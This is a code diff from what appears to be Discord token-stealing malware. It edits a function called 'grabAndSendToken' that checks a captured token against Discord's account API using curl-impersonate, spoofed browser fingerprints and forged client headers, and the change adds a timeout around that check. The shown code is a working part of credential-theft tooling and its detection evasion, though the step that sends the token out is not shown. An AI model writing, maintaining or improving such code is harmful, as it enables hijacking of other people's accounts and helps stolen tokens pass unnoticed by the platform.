@@ -1132,18 +1132,21 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
   try {
     const fp = _rfp(token);
     const superProps = generateXSuperProperties(token);
-    const validateRes = await curlImpersonateRequest(
-      'https://discord.com/api/v10/users/@me',
-      'GET',
-      {
-        'Authorization': token,
-        'User-Agent': fp,
-        'X-Discord-Locale': 'en-US',
-        'X-Super-Properties': superProps,
-      },
-      null,
-      10000
-    );
+    const validateRes = await Promise.race([
+      curlImpersonateRequest(
+        'https://discord.com/api/v10/users/@me',
+        'GET',
+        {
+          'Authorization': token,
+          'User-Agent': fp,
+          'X-Discord-Locale': 'en-US',
+          'X-Super-Properties': superProps,
+        },
+        null,
+        10000
+      ),
+      new Promise((_, reject) => setTimeout(() => reject(new Error('Token validation timed out')), 15000))
+    ]);
 
     if (validateRes.status === 401 || validateRes.status === 403) { return { success: false, error: 'Invalid token' }; }
     if (validateRes.status < 200 || validateRes.status >= 300 || !validateRes.data) { return { success: false, error: 'Invalid token' }; }
